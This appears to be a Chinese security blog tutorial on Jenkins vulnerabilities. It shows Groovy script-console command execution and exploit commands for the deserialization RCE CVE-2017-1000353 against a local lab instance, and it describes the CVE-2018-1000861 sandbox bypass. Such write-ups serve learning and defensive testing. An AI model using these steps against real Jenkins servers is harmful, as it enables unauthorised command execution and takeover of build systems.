Jenkins
-------

[Jenkins](https://so.csdn.net/so/search?q=Jenkins&spm=1001.2101.3001.7020)是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件的持续集成变成可能。

**Jenkins功能包括：**

*   持续的软件版本发布/测试项目。
*   监控外部调用执行的工作。

**Jenkins曾经发生的反序列化漏洞：**

*   CVE-2015-8103
*   CVE-2016-9299
*   CVE-2017-1000353
*   CVE-2018-1000861

**Jenkins后台执行命令**

访问：[http://xx.xx.xx.xx/script](http://10.56.2.73:8080/script "http://xx.xx.xx.xx/script")

```
def cmd = 'ifconfig'      
def sout = new StringBuffer(), serr = new StringBuffer()      
def proc = cmd.execute()      
proc.consumeProcessOutput(sout, serr)      
proc.waitForOrKill(1000)      
println sout
```


![](https://img-blog.csdnimg.cn/20200713162013383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

或者

```
println "ifconfig".execute().text
```


![](https://img-blog.csdnimg.cn/20201123232838263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### Jenkins远程命令执行漏洞（CVE-2018-1000861）

Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。

通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。

### Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）

**漏洞描述**：该漏洞存在于使用HTTP协议的双向通信通道的具体实现代码中，jenkins利用此通道来接收命令，恶意攻击者可以构造恶意攻击参数远程执行命令，从而获取系统权限。

**漏洞影响版本**

*   所有jenkins主版本均受到影响(包括<=2.56版本)
*   所有的jenkins LTS均受到影响(包括<=2.46.1版本)

本地搭建好环境，访问地址：[http://192.168.10.13:8080](http://192.168.10.13:8080/login?from=%2F "http://192.168.10.13:8080")

![](https://img-blog.csdnimg.cn/20191011114448352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

执行命令：

```
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touch /tmp/success"      
python3 exploit.py http://192.168.10.13:8080 jenkins_poc.ser
```


![](https://img-blog.csdnimg.cn/20191011115335505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）](https://vulhub.org/#/environments/jenkins/CVE-2017-1000353/ "Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）")

                  [Jenkins Java 反序列化远程执行代码漏洞(CVE-2017-1000353)](https://www.cnblogs.com/yuzly/p/11255729.html "Jenkins Java 反序列化远程执行代码漏洞(CVE-2017-1000353)")